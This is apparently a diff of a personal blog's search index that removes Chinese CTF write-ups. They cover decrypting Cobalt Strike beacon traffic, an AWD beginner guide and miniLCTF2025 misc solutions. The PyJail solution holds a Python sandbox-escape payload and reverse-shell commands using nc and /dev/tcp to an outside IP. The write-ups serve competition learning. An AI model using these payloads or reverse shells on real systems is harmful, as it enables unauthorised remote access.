&#123;&#125;&quot;.format(hmac_key.hex()))print(dec[12:int.from_bytes(dec[4:8], byteorder=&#x27;big&#x27;, signed=False)])print(hexdump.hexdump(dec))
-
-需要修改的就只有三个：file_path、encode_data、encrypt_data
-同时因为心跳包（submit.php的data）不止一个，需要我们修改脚本里的encrypt_data多次尝试。
-。
-。
-。
-第二种方法：
-这种是一步步来的，分了大概四步
-因为是CTF比赛所以会有.cobaltstrike.beacon_keys 文件，同时该文件本质上为 KeyPair 的 Java 对象，Python 的 javaobj-py3 库可以直接读取里面存储的数据。
-首先，我们需要先获取 .cobaltstrike.beacon_keys 文件中的私钥。这个私钥是 RSA 私钥，用于解密元数据。
-脚本：
-import base64import javaobj.v2 as javaobjwith open(&quot;.cobaltstrike.beacon_keys&quot;, &quot;rb&quot;) as fd:    pobj = javaobj.load(fd)def format_key(key_data, key_type):    key_data = bytes(map(lambda x: x &amp; 0xFF, key_data))    formatted_key = f&quot;-----BEGIN &#123;key_type&#125; KEY-----\n&quot;    formatted_key += base64.encodebytes(key_data).decode()    formatted_key += f&quot;-----END &#123;key_type&#125; KEY-----&quot;    return formatted_keyprivateKey = format_key(pobj.array.value.privateKey.encoded.data, &quot;PRIVATE&quot;)publicKey = format_key(pobj.array.value.publicKey.encoded.data, &quot;PUBLIC&quot;)print(privateKey)print(publicKey)
-
-然后我们在通过私钥解密元数据、获取 AES KEY，其中 encode_data 为元数据，也就是之前看到的 cookie 的值。
-那什么是AESkey呢？
-因为Cobalt Strike 的 Beacon 通信主要依赖于 AES key 和 HMAC key 。这两个密钥都是由 Beacon 在每次执行时随机生成的 16字节数据。
-AES key：这个密钥用于加密和解密 Beacon 与 C2 服务器之间的通信内容。具体来说，它用于 AES 算法，该算法用于加密和解密Beacon任务的传输。
-HMAC key ：这个密钥用于验证数据的完整性和真实性。HMAC （Hash-based Message Authentication Code）是一种基于密钥的哈希算法，用于在不安全的通信环境中验证消息的完整性和真实性。
-这两个密钥都是由同一组16字节数据生成的。具体来说，这组16字节数据的 SHA256 哈希的前半部分作为 HMAC 密钥，后半部分作为 AES 密钥。
-脚本：
-import hashlibfrom Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_v1_5import base64import hexdumpPRIVATE_KEY = &quot;&quot;&quot;-----BEGIN PRIVATE KEY-----&#123;MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAIzAss/1Vcd49UN5XT+pVELCnX1rTo4LhSzcP7sPOrIOQg0onSpKO1tzOVX+2DqtZsSFoFrAmrEV+gZCbFfhYR9vs5DGLUg9aa0i5GqhPz/s4v5wcmgUgfnvjh4oK7yPQ5BMcqESCjEim9MXs70by1U7ZN+wOYZEorInV9gPkCJdAgMBAAECgYAJbRpMjQyamEIsq6MQEWIAOpJbhOU05BaeI33tJB71L7lCslacL258OGI9nRyUCWrZfG15xm5Vr7gX1Tj2RbTAUZmGigY1X2rCyz00DFjj5iIQVWsl8eSI1EmjFmQ+rYnCezQcrt4V3c7BZtW9RjFWvHh09PF808Yl4/+++vrMoQJBAKhCa/adRGEFqiVcSZG2FdlUG4bPMfwRkYMERZG5D6fjVHOVNEyL3MK+EtafnYIDD1IS+97K0cbg922RKXNdv+kCQQDWJk0kNe8ePBpwJU4slig1Y+4VWuwTRz6r+MNpv+WrVMzo/LHzAKYn87pyAdxLaZyKAFKs86WpJ2n93ZslC9pVAkA0KMMHJCF6YiMoib9UqDmFsYkG9VvtZBTTpJNcZR3xUYtweSRJRmIdDIcSeVB+aSxqqO/jVMRK/po1IPbUiI9hAkEAi93wPFpNlv3CdsSmzlA0asqd0azUy7KYqFGNsB/5rXFxdCq3PvOJkkaJ27SDYW3VI/0aAoQQCu8HNxvqHMQlEQJBAIFIkfpeSfksLu8NgiFvZsTV8EWF9PfF2VLyqeSGtmySujqb0HbxGnM9SDc0k48wOvIn5YGJPyY2ddsyNI6XbCU=&#125;-----END PRIVATE KEY-----&quot;&quot;&quot;#rsa私钥encode_data = &quot;U8jm3+oqzYLuUiRd9F3s7xVz7fGnHQYIKF9ch6GRseWfcBSSk+aGhWP3ZUyHIkwRo1/oDCcKV7LYAp022rCm9bC7niOgMlsvgLRolMKIz+Eq5hCyQ0QVScH8jDYsJsCyVw1iaTf5a7gHixIDrSbTp/GiPQIwcTNZBXIJrll540s=&quot;#元数据private_key = RSA.import_key(PRIVATE_KEY.encode())cipher = PKCS1_v1_5.new(private_key)ciphertext = cipher.decrypt(base64.b64decode(encode_data), 0)if ciphertext[0:4] == b&#x27;\x00\x00\xBE\xEF&#x27;:    raw_aes_keys = ciphertext[8:24]    raw_aes_hash256 = hashlib.sha256(raw_aes_keys).digest()    aes_key = raw_aes_hash256[0:16]    hmac_key = raw_aes_hash256[16:]    print(&quot;AES key: &#123;&#125;&quot;.format(aes_key.hex()))    print(&quot;HMAC key: &#123;&#125;&quot;.format(hmac_key.hex()))    hexdump.hexdump(ciphertext)
-
-到此我们就得到了 AES key 和 HMAC key
-接着要去解密 submit.php 所传递的 Data ，首先我们要先对该串16进制数据进行处理，转字符串后进行 Base64 编码
-import base64encode_data = &#x27;000000c093dff6b2f058ba4231e3900276566441f2bb4c76e5c8480874a4d99df083054a5ea1dd4aea5523c751af7d123ee8e9f2253a5ccdcf54427d147c556b15657ee2607e92b35732f26341bc0a26c58bf2bcf2383ad640641c364159387223360cc16ff3dc14ab1f00e6ee4fb53f5e15b767bd379451d0d7b6f4aeae9db0c3f30f3ef167b7db3e6ac241643ed2513e73f9e9148ebe7afaa122ea75e945c8ab8a816179e43180257bd8be752827dd0de26826d5611ee09391ee5545897dae1d3a9698&#x27;#任务数据bytes_data = bytes.fromhex(encode_data)encrypt_data = base64.b64encode(bytes_data)print(encrypt_data.decode())
-
-最终分别填入 SHARED_KEY，HMAC_KEY，encrypt_data 即可
-import hmacimport binasciiimport base64import hexdumpfrom Crypto.Cipher import AESSHARED_KEY = binascii.unhexlify(&quot;ef08974c0b06bd5127e04ceffe12597b&quot;)#AES keyHMAC_KEY = binascii.unhexlify(&quot;bd87fa356596a38ac3e3bb0b6c3496e9&quot;)#HMAC keyencrypt_data = &quot;AAAAwJPf9rLwWLpCMeOQAnZWZEHyu0x25chICHSk2Z3wgwVKXqHdSupVI8dRr30SPujp8iU6XM3PVEJ9FHxVaxVlfuJgfpKzVzLyY0G8CibFi/K88jg61kBkHDZBWThyIzYMwW/z3BSrHwDm7k+1P14Vt2e9N5RR0Ne29K6unbDD8w8+8We32z5qwkFkPtJRPnP56RSOvnr6oSLqdelFyKuKgWF55DGAJXvYvnUoJ90N4mgm1WEe4JOR7lVFiX2uHTqWmA==&quot;#任务数据（解密过的）def decrypt(encrypted_data, iv_bytes, signature, shared_key, hmac_key):    if hmac.new(hmac_key, encrypted_data, digestmod=&quot;sha256&quot;).digest()[:16] != signature:        print(&quot;message authentication failed&quot;)        return    cipher = AES.new(shared_key, AES.MODE_CBC, iv_bytes)    return cipher.decrypt(encrypted_data)encrypt_data = base64.b64decode(encrypt_data)encrypt_data_length = int.from_bytes(encrypt_data[:4], byteorder=&#x27;big&#x27;, signed=False)encrypt_data_l = encrypt_data[4:]data1 = encrypt_data_l[:encrypt_data_length-16]signature = encrypt_data_l[encrypt_data_length-16:encrypt_data_length]iv_bytes = b&quot;abcdefghijklmnop&quot;dec = decrypt(data1, iv_bytes, signature, SHARED_KEY, HMAC_KEY)print(&quot;counter: &#123;&#125;&quot;.format(int.from_bytes(dec[:4], byteorder=&#x27;big&#x27;, signed=False)))print(&quot;任务返回长度: &#123;&#125;&quot;.format(int.from_bytes(dec[4:8], byteorder=&#x27;big&#x27;, signed=False)))print(&quot;任务输出类型: &#123;&#125;&quot;.format(int.from_bytes(dec[8:12], byteorder=&#x27;big&#x27;, signed=False)))print(dec[12:int.from_bytes(dec[4:8], byteorder=&#x27;big&#x27;, signed=False)])print(hexdump.hexdump(dec))
-
-就OK了
-例题： 2023 SICTF 一起上号不         解析： Misc Record | MetaVi （在#杂题那）
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>Network</tag>
       </tags>
   </entry>
   <entry>
@@ -1941,232 +1941,6 @@ flag：VNCTF{W0w_Y0u_Ar3_G0od_4t_R4di0_S1gn4L}
       </tags>
   </entry>
   <entry>
-    <title>awd初体验</title>
-    <url>/2024/12/awd%E5%88%9D%E4%BD%93%E9%AA%8C/</url>
-    <content><![CDATA[前言哎，，再次感到misc果然还是要会点web或者re才行
-这个awd会给你一个服务器需要你ssh连接起来，连起来之后需要tar下html里面的东西，然后查杀漏洞，维护，攻击别人的。
-以bugku的awd为例报名比赛后能得到一些东西，比如ip白名单，账号密码，token，虚拟ip等
-ip白名单——队长加的队员ip
-账号密码——一会连ssh有用（以：分隔）
-token——提交flag时用
-虚拟ip——连ssh，注意端口是2222
-使用Tabby连接项目地址： https://tabby.sh/ 注意要下windows的（tabby基础讲解： 这里）
-打开后点开设置/配置与连接
-
-
-点击新建/新配置，选择ssh连接
-看到一个空白页面，填写：
-名称—主机—端口—用户名—密码
-如下：
-
-
-然后点击新建页面旁边的那个框框，再选择刚刚建的ssh就可以开始连接了
-
-
-等一会就连接成功了
-SFTP传输工具tabby是自带sftp工具的，连接成功后在右上角就能看到
-点开后能弹出服务器上的目录，如果想下载里面的一些东西可以直接点击会出现保存文件的提示，然后保存就行
-如果想上传文件可以直接拖拽文件，也能点右上角的upload
-html相关下载——tar命令连接成功之后可以打包下载html里的东西了，在var/www/html里。
-但是html是无法直接下的，那怎么办呢？使用tar命令
-tar -czvf myfolder.tar.gz /var/www/html/*# 这个命令会打包html里的所有东西tar -czvf web.tar.gz ./*# 打包当前目录下所有东西到当前文件夹下
-
-打包完成的东西在home的一个文件夹里（这里是忘了具体在哪了。。）
-然后就能看到一个myfolder.tar.gz或者web.tar.gz，直接点击保存下来就好
-查找漏洞+修改+上传保存下来的html文件夹可以用D盾来扫描漏洞，然后找到对应漏洞，修改。
-这里可以直接在tabby上的服务器文件里修改，或者本地修改完再上传到服务器上
-改完漏洞就能加固我们的防御了。
-沙箱跑木马我们可以利用在线沙箱来跑恶意代码，顺便让它帮我们分析一下
-安恒云沙箱： 安恒云沙箱-下一代沙箱的领航者
-如果是哥斯拉，蚁剑，冰蝎，天蝎，之类的常规工具可以直接分析出来
-apache日志分析
-常见日志文件位置
-
-
-
-Apache日志
-访问日志 ：默认位置通常是&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log.1（Debian&#x2F;Ubuntu）或&#x2F;var&#x2F;log&#x2F;httpd&#x2F;access_log.1（CentOS&#x2F;RHEL）。
-错误日志 ：默认位置通常是&#x2F;var&#x2F;log&#x2F;apache2&#x2F;error.log.1（Debian&#x2F;Ubuntu）或&#x2F;var&#x2F;log&#x2F;httpd&#x2F;error_log.1（CentOS&#x2F;RHEL）。
-
-
-SSH日志
-身份验证日志 ：通常位于&#x2F;var&#x2F;log&#x2F;auth.log（Debian&#x2F;Ubuntu）或&#x2F;var&#x2F;log&#x2F;secure（CentOS&#x2F;RHEL）。
-
-
-系统日志
-系统日志 ：通常位于&#x2F;var&#x2F;log&#x2F;syslog（Debian&#x2F;Ubuntu）或&#x2F;var&#x2F;log&#x2F;messages（CentOS&#x2F;RHEL）。
-
-
-
-
-我们可以进入/var/log/apache2日志目录。
-可以dump下来分析，也可以直接在上面筛选
-需要一定的linux知识
-
-
-cut: 这是一个命令，用于从每一行文本中剪切出指定部分。
--d-: 指定分隔符为 -
--f 1: 指定要剪切的字段为第一个字段。
-access.log.1: 这是要处理的日志文件的文件名或路径。
-
-
-uniq -c: 这个命令会从输入中删除重复的行，并且计算每行重复出现的次数。
--c: 会在输出中显示每行重复出现的次数。
-
-
-sort : 这个命令会对输入进行排序。
--r: 表示反向排序，即降序排列。
--n: 表示按照数值大小排序。
-
-
-head -20: 最后，这个命令会从排序后的结果中提取前 20 行。
-| : 管道命令符，表示前一项的输出结果作为后一项的输入
-
-
-]]></content>
-      <categories>
-        <category>AWD</category>
-      </categories>
-      <tags>
-        <tag>awd</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>miniLCTF2025misc全解</title>
-    <url>/2025/05/miniLCTF2025misc%E5%85%A8%E8%A7%A3/</url>
-    <content><![CDATA[吃豆人简单的前端游戏，不知道为什么扔到misc了。。
-看一眼源码
-
-
-那就预先在控制台输好score
-输完再私一下就拿到flag
-
-
-
-
-麦霸评分先本地wsrx连接上环境，我这里是6033
-题目要求唱歌然后打分，我们py写个脚本把原始音频下过来，再传上去就好了
-#!/usr/bin/env python3# -*- coding: utf-8 -*-import requestsdef get_flag(base_url: str = &quot;http://127.0.0.1:6033&quot;):    session = requests.Session()    # 1. 先下载原始音频    print(&quot;[*] 正在下载原始音频…&quot;)    resp = session.get(f&quot;&#123;base_url&#125;/original.wav&quot;)    resp.raise_for_status()    audio_data = resp.content    # （可选）调用一次 /prepare-recording 来清理旧录音    try:        session.get(f&quot;&#123;base_url&#125;/prepare-recording&quot;, timeout=5)    except Exception:        pass  # 出错也不影响    # 2. 上传「你的录音」——其实就是原始音频本身    print(&quot;[*] 正在上传“录音”进行对比…&quot;)    files = &#123;        &#x27;audio&#x27;: (&#x27;original.wav&#x27;, audio_data, &#x27;audio/wav&#x27;)    &#125;    resp2 = session.post(f&quot;&#123;base_url&#125;/compare-recording&quot;, files=files)    resp2.raise_for_status()    # 3. 解析返回的 JSON，拿 flag    data = resp2.json()    if data.get(&quot;flag&quot;):        print(&quot;🎉 Flag:&quot;, data[&quot;flag&quot;])    else:        print(&quot;⚠️ 服务器返回:&quot;, data)if __name__ == &quot;__main__&quot;:    get_flag()
-
-
-
-
-
-PyJail连上即给源码
-import socketserverimport sysimport astimport iowith open(__file__, &quot;r&quot;, encoding=&quot;utf-8&quot;) as f:    source_code = f.read()class SandboxVisitor(ast.NodeVisitor):    def visit_Attribute(self, node):        if isinstance(node.attr, str) and node.attr.startswith(&quot;__&quot;):            raise ValueError(&quot;Access to private attributes is not allowed&quot;)        self.generic_visit(node)def safe_exec(code: str, sandbox_globals=None):    original_stdout = sys.stdout    original_stderr = sys.stderr    sys.stdout = io.StringIO()    sys.stderr = io.StringIO()    if sandbox_globals is None:        sandbox_globals = &#123;            &quot;__builtins__&quot;: &#123;                &quot;print&quot;: print,                &quot;any&quot;: any,                &quot;len&quot;: len,                &quot;RuntimeError&quot;: RuntimeError,                &quot;addaudithook&quot;: sys.addaudithook,                &quot;original_stdout&quot;: original_stdout,                &quot;original_stderr&quot;: original_stderr            &#125;        &#125;    try:        tree = ast.parse(code)        SandboxVisitor().visit(tree)        exec(code, sandbox_globals)        output = sys.stdout.getvalue()        sys.stdout = original_stdout        sys.stderr = original_stderr        return output, sandbox_globals    except Exception as e:        sys.stdout = original_stdout        sys.stderr = original_stderr        return f&quot;Error: &#123;str(e)&#125;&quot;, sandbox_globalsCODE = &quot;&quot;&quot;def my_audit_checker(event, args):    blocked_events = [        &quot;import&quot;, &quot;time.sleep&quot;, &quot;builtins.input&quot;, &quot;builtins.input/result&quot;, &quot;open&quot;, &quot;os.system&quot;,         &quot;eval&quot;,&quot;subprocess.Popen&quot;, &quot;subprocess.call&quot;, &quot;subprocess.run&quot;, &quot;subprocess.check_output&quot;    ]    if event in blocked_events or event.startswith(&quot;subprocess.&quot;):        raise RuntimeError(f&quot;Operation not allowed: &#123;event&#125;&quot;)addaudithook(my_audit_checker)&quot;&quot;&quot;class Handler(socketserver.BaseRequestHandler):    def handle(self):        self.request.sendall(b&quot;Welcome to Interactive Pyjail!\n&quot;)        self.request.sendall(b&quot;Rules: No import / No sleep / No input\n\n&quot;)        try:            self.request.sendall(b&quot;========= Server Source Code =========\n&quot;)            self.request.sendall(source_code.encode() + b&quot;\n&quot;)            self.request.sendall(b&quot;========= End of Source Code =========\n\n&quot;)        except Exception as e:            self.request.sendall(b&quot;Failed to load source code.\n&quot;)            self.request.sendall(str(e).encode() + b&quot;\n&quot;)        self.request.sendall(b&quot;Type your code line by line. Type &#x27;exit&#x27; to quit.\n\n&quot;)        prefix_code = CODE        sandbox_globals = None        while True:            self.request.sendall(b&quot;&gt;&gt;&gt; &quot;)            try:                user_input = self.request.recv(4096).decode().strip()                if not user_input:                    continue                if user_input.lower() == &quot;exit&quot;:                    self.request.sendall(b&quot;Bye!\n&quot;)                    break                if len(user_input) &gt; 100:                    self.request.sendall(b&quot;Input too long (max 100 chars)!\n&quot;)                    continue                full_code = prefix_code + user_input + &quot;\n&quot;                prefix_code = &quot;&quot;                result, sandbox_globals = safe_exec(full_code, sandbox_globals)                self.request.sendall(result.encode() + b&quot;\n&quot;)            except Exception as e:                self.request.sendall(f&quot;Error occurred: &#123;str(e)&#125;\n&quot;.encode())                breakif __name__ == &quot;__main__&quot;:    HOST, PORT = &quot;0.0.0.0&quot;, 5000    with socketserver.ThreadingTCPServer((HOST, PORT), Handler) as server:        print(f&quot;Server listening on &#123;HOST&#125;:&#123;PORT&#125;&quot;)        server.serve_forever()
-
-省流:
-def my_audit_checker(event, args):    blocked_events = [        &quot;import&quot;, &quot;time.sleep&quot;, &quot;builtins.input&quot;, &quot;builtins.input/result&quot;, &quot;open&quot;, &quot;os.system&quot;,         &quot;eval&quot;,&quot;subprocess.Popen&quot;, &quot;subprocess.call&quot;, &quot;subprocess.run&quot;, &quot;subprocess.check_output&quot;    ]    if event in blocked_events or event.startswith(&quot;subprocess.&quot;):        raise RuntimeError(f&quot;Operation not allowed: &#123;event&#125;&quot;)addaudithook(my_audit_checker)
-
-就是要在这个钩子的限制下逃逸并且限制能用的东西只有如下
-&quot;__builtins__&quot;: &#123;                &quot;print&quot;: print,                &quot;any&quot;: any,                &quot;len&quot;: len,                &quot;RuntimeError&quot;: RuntimeError,                &quot;addaudithook&quot;: sys.addaudithook,                &quot;original_stdout&quot;: original_stdout,                &quot;original_stderr&quot;: original_stderr                &#125;
-
-并且有提示No import / No sleep / No input
-还ban掉了类似ssti向下找的方法
-
-
-1.ban了关键字&#x27;__&#x27;2.
-
-看了眼，知道是栈帧逃逸
-打一个大致的poc
-a=(a.gi_frame.f_back.f_back for i in [2]);a=[x for x in a][0]b = a.f_back.f_globals[&#x27;sys&#x27;]os = b.modules.get(&#x27;os&#x27;)
-
-这边其实蛮犹豫要不要用os打的
-但是其他模块其实也没什么可以利用的
-#sys下的模块&#123;&#x27;sys&#x27;: &lt;module &#x27;sys&#x27; (built-in)&gt;,  &#x27;builtins&#x27;: &lt;module &#x27;builtins&#x27; (built-in)&gt;, &#x27;_frozen_importlib&#x27;: &lt;module &#x27;_frozen_importlib&#x27; (frozen)&gt;,  &#x27;_imp&#x27;: &lt;module &#x27;_imp&#x27; (built-in)&gt;, &#x27;_thread&#x27;: &lt;module &#x27;_thread&#x27; (built-in)&gt;, &#x27;_warnings&#x27;: &lt;module &#x27;_warnings&#x27; (built-in)&gt;, &#x27;_weakref&#x27;: &lt;module &#x27;_weakref&#x27; (built-in)&gt;, &#x27;_io&#x27;: &lt;module &#x27;_io&#x27; (built-in)&gt;,  &#x27;marshal&#x27;: &lt;module &#x27;marshal&#x27; (built-in)&gt;, &#x27;posix&#x27;: &lt;module &#x27;posix&#x27; (built-in)&gt;,  &#x27;_frozen_importlib_external&#x27;: &lt;module &#x27;_frozen_importlib_external&#x27; (frozen)&gt;,  &#x27;time&#x27;: &lt;module &#x27;time&#x27; (built-in)&gt;, &#x27;zipimport&#x27;: &lt;module &#x27;zipimport&#x27; (frozen)&gt;,  &#x27;_codecs&#x27;: &lt;module &#x27;_codecs&#x27; (built-in)&gt;, &#x27;codecs&#x27;: &lt;module &#x27;codecs&#x27; (frozen)&gt;, &#x27;encodings.aliases&#x27;: &lt;module &#x27;encodings.aliases&#x27; from &#x27;/usr/local/lib/python3.11/encodings/aliases.py&#x27;&gt;,  &#x27;encodings&#x27;: &lt;module &#x27;encodings&#x27; from &#x27;/usr/local/lib/python3.11/encodings/__init__.py&#x27;&gt;, &#x27;encodings.utf_8&#x27;: &lt;module &#x27;encodings.utf_8&#x27; from &#x27;/usr/local/lib/python3.11/encodings/utf_8.py&#x27;&gt;,  &#x27;_signal&#x27;: &lt;module &#x27;_signal&#x27; (built-in)&gt;, &#x27;_abc&#x27;: &lt;module &#x27;_abc&#x27; (built-in)&gt;,  &#x27;abc&#x27;: &lt;module &#x27;abc&#x27; (frozen)&gt;,  &#x27;io&#x27;: &lt;module &#x27;io&#x27; (frozen)&gt;,  &#x27;__main__&#x27;: &lt;module &#x27;__main__&#x27; from &#x27;/app/app.py&#x27;&gt;,  &#x27;_stat&#x27;: &lt;module &#x27;_stat&#x27; (built-in)&gt;,  &#x27;stat&#x27;: &lt;module &#x27;stat&#x27; (frozen)&gt;,  &#x27;_collections_abc&#x27;: &lt;module &#x27;_collections_abc&#x27; (frozen)&gt;,  &#x27;genericpath&#x27;: &lt;module &#x27;genericpath&#x27; (frozen)&gt;,  &#x27;posixpath&#x27;: &lt;module &#x27;posixpath&#x27; (frozen)&gt;,  &#x27;os.path&#x27;: &lt;module &#x27;posixpath&#x27; (frozen)&gt;,  &#x27;os&#x27;: &lt;module &#x27;os&#x27; (frozen)&gt;,  &#x27;_sitebuiltins&#x27;: &lt;module &#x27;_sitebuiltins&#x27; (frozen)&gt;,  &#x27;_distutils_hack&#x27;: &lt;module &#x27;_distutils_hack&#x27; from &#x27;/usr/local/lib/python3.11/site-packages/_distutils_hack/__init__.py&#x27;&gt;,  &#x27;site&#x27;: &lt;module &#x27;site&#x27; (frozen)&gt;,  &#x27;_socket&#x27;: &lt;module &#x27;_socket&#x27; from &#x27;/usr/local/lib/python3.11/lib-dynload/_socket.cpython-311-x86_64-linux-musl.so&#x27;&gt;,  &#x27;itertools&#x27;: &lt;module &#x27;itertools&#x27; (built-in)&gt;,  &#x27;keyword&#x27;: &lt;module &#x27;keyword&#x27; from &#x27;/usr/local/lib/python3.11/keyword.py&#x27;&gt;,  &#x27;_operator&#x27;: &lt;module &#x27;_operator&#x27; (built-in)&gt;,  &#x27;operator&#x27;: &lt;module &#x27;operator&#x27; from &#x27;/usr/local/lib/python3.11/operator.py&#x27;&gt;,  &#x27;reprlib&#x27;: &lt;module &#x27;reprlib&#x27; from &#x27;/usr/local/lib/python3.11/reprlib.py&#x27;&gt;,  &#x27;_collections&#x27;: &lt;module &#x27;_collections&#x27; (built-in)&gt;,  &#x27;collections&#x27;: &lt;module &#x27;collections&#x27; from &#x27;/usr/local/lib/python3.11/collections/__init__.py&#x27;&gt;,  &#x27;collections.abc&#x27;: &lt;module &#x27;collections.abc&#x27; from &#x27;/usr/local/lib/python3.11/collections/abc.py&#x27;&gt;,  &#x27;math&#x27;: &lt;module &#x27;math&#x27; from &#x27;/usr/local/lib/python3.11/lib-dynload/math.cpython-311-x86_64-linux-musl.so&#x27;&gt;, &#x27;select&#x27;: &lt;module &#x27;select&#x27; from &#x27;/usr/local/lib/python3.11/lib-dynload/select.cpython-311-x86_64-linux-musl.so&#x27;&gt;, &#x27;selectors&#x27;: &lt;module &#x27;selectors&#x27; from &#x27;/usr/local/lib/python3.11/selectors.py&#x27;&gt;,  &#x27;types&#x27;: &lt;module &#x27;types&#x27; from &#x27;/usr/local/lib/python3.11/types.py&#x27;&gt;,  &#x27;_functools&#x27;: &lt;module &#x27;_functools&#x27; (built-in)&gt;,  &#x27;functools&#x27;: &lt;module &#x27;functools&#x27; from &#x27;/usr/local/lib/python3.11/functools.py&#x27;&gt;,  &#x27;enum&#x27;: &lt;module &#x27;enum&#x27; from &#x27;/usr/local/lib/python3.11/enum.py&#x27;&gt;,  &#x27;errno&#x27;: &lt;module &#x27;errno&#x27; (built-in)&gt;,  &#x27;array&#x27;: &lt;module &#x27;array&#x27; from &#x27;/usr/local/lib/python3.11/lib-dynload/array.cpython-311-x86_64-linux-musl.so&#x27;&gt;, &#x27;socket&#x27;: &lt;module &#x27;socket&#x27; from &#x27;/usr/local/lib/python3.11/socket.py&#x27;&gt;,  &#x27;_weakrefset&#x27;: &lt;module &#x27;_weakrefset&#x27; from &#x27;/usr/local/lib/python3.11/_weakrefset.py&#x27;&gt;,  &#x27;threading&#x27;: &lt;module &#x27;threading&#x27; from &#x27;/usr/local/lib/python3.11/threading.py&#x27;&gt;,  &#x27;socketserver&#x27;: &lt;module &#x27;socketserver&#x27; from &#x27;/usr/local/lib/python3.11/socketserver.py&#x27;&gt;,  &#x27;_ast&#x27;: &lt;module &#x27;_ast&#x27; (built-in)&gt;,  &#x27;contextlib&#x27;: &lt;module &#x27;contextlib&#x27; from &#x27;/usr/local/lib/python3.11/contextlib.py&#x27;&gt;,  &#x27;ast&#x27;: &lt;module &#x27;ast&#x27; from &#x27;/usr/local/lib/python3.11/ast.py&#x27;&gt;&#125;
-
-接着用
-print(os.listdir(&#x27;/&#x27;))
-
-看到了这个
-
-
-接着就有点迷糊不知道怎么读取了
-因为open和system这些能利用的都被ban了
-r, w = os.pipe()pid = os.fork()os.close(r); os.dup2(w, 1);os.execv(&#x27;/bin/sh&#x27;, [&#x27;sh&#x27;, &#x27;-c&#x27;, f&#x27;cat /flag.txt&#x27;]); os._exit(0)os.close(w); os.waitpid(pid, 0); data = os.read(r, 4096); print(data.decode())
-
-
-看来需要根据时间来查一下
-替换一下为os.execv(&#x27;/bin/sh&#x27;, [&#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;find / -mtime 1 -print&#x27;]); 
-
-
-
-大概找到路径了
-但是问题来了
-在这样的路径下怎么读取呢?
-一般说，这样的路径用linux执行是会被转义的
-而在python中也拒绝\x0a这类的出现
-然后有一个递归读取的东西
-完整poc:
-a=(a.gi_frame.f_back.f_back for i in [2]);a=[x for x in a][0]b = a.f_back.f_globals[&#x27;sys&#x27;]os = b.modules.get(&#x27;os&#x27;)r, w = os.pipe()pid = os.fork()os.close(r); os.dup2(w, 1);os.execv(&#x27;/bin/sh&#x27;, [&#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;ls -la&#x27;]); os._exit(0)#os.execv(&#x27;/bin/sh&#x27;, [&#x27;sh&#x27;, &#x27;-c&#x27;, f&#x27;wc -c &#123;path&#125;&#x27;]); os._exit(0)os.execv(&#x27;/bin/sh&#x27;, [&#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;find /tmp -type f -exec cat &#123;&#125; \\;&#x27;]); os._exit(0)os.close(w); os.waitpid(pid, 0); data = os.read(r, 512); print(data.decode())os.execv(&#x27;/bin/sh&#x27;, [&#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;find /tmp/.\\x0a\\x0b\\x00hidden/ -mtime 1 -print&#x27;]); find / -mtime 1 -printos.execv(&#x27;/bin/sh&#x27;, [&#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;busybox nc 111.229.205.196 9001 -e sh&#x27;]); os._exit(0)os.execv(&#x27;/bin/sh&#x27;, [&#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh -i &gt;&amp; /dev/tcp/111.229.205.196/9001 0&gt;&amp;1&#x27;]); os._exit(0)os.close(w); os.waitpid(pid, 0); data = os.read(r, 4096); print(data.decode())//缓冲区太大
-
-中间是有一个小插曲的
-就是他的那个目录下
-哈哈一点都不好笑
-而且缓存区开太大靶机会直接死机
-中间一段直接红温了
-好在最后还是出了，拿了3血，www
-MiniForensicsⅠ看到桌面上有个“没什么用的b.txt”
-看题目描述说bitlocker恢复密钥传到了服务器上，我们直接查看桌面上流量就好
-在流量里发现
-
-
-接着往下翻就能看到恢复密钥了
-
-
-521433-074470-317097-543499-149259-301488-189849-252032
-
-然后我们把加密的d盘使用取证大师挂载一下（或者直接虚拟机打开也行）
-bitlocker解密一下
-在d盘里发现一个c.txt
-由于是画图，我们直接使用脚本
-这里先把c的图画了
-import matplotlib.pyplot as plt# 坐标数据（x, y）data_str = &quot;&quot;&quot;#数据填写处&quot;&quot;&quot;# 解析坐标points = [tuple(map(float, pair.split(&#x27;,&#x27;))) for pair in data_str.split()]x_vals, y_vals = zip(*points)# 创建图像plt.figure(figsize=(10, 6))  # 拉长纵向显示plt.plot(x_vals, y_vals, marker=&#x27;o&#x27;, linestyle=&#x27;-&#x27;)plt.title(&quot;坐标点折线图&quot;)plt.xlabel(&quot;X&quot;)plt.ylabel(&quot;Y&quot;)plt.grid(True)# 设置y轴范围，使其上下拉伸（例如以中心为215，上下扩展±5）plt.ylim(min(y_vals) - 5, max(y_vals) + 5)plt.tight_layout()plt.show()
-
-画了c的图发现是反转的
-反转回来：
-
-
-发现是fake_flag，但是提醒我们计算a.txt，使用脚本：
-# 读取文件并解析为二维浮点列表def read_coords(filename):    with open(filename, &#x27;r&#x27;) as f:        lines = f.readlines()    coords = [tuple(map(float, line.strip().split(&#x27;,&#x27;))) for line in lines if line.strip()]    return coords# 写入结果到 a.txtdef write_coords(filename, coords):    with open(filename, &#x27;w&#x27;) as f:        for x, y in coords:            f.write(f&quot;&#123;x&#125;,&#123;y&#125;\n&quot;)# 主逻辑b_coords = read_coords(&#x27;b.txt&#x27;)c_coords = read_coords(&#x27;c.txt&#x27;)# 取最短长度，避免索引越界min_len = min(len(b_coords), len(c_coords))if len(b_coords) != len(c_coords):    print(f&quot;警告：b.txt 和 c.txt 的行数不一致，仅处理前 &#123;min_len&#125; 行&quot;)# 计算 a = 2b - ca_coords = [    (2 * bx - cx, 2 * by - cy)    for (bx, by), (cx, cy) in zip(b_coords[:min_len], c_coords[:min_len])]# 保存结果write_coords(&#x27;a.txt&#x27;, a_coords)print(&quot;a.txt 已成功生成！&quot;)
-
-然后再利用画图脚本画出a.txt：
-
-
-反转一下看到flag：
-
-
-flag：miniLCTF{forens1c5_s0ooooo_1nt4resting}
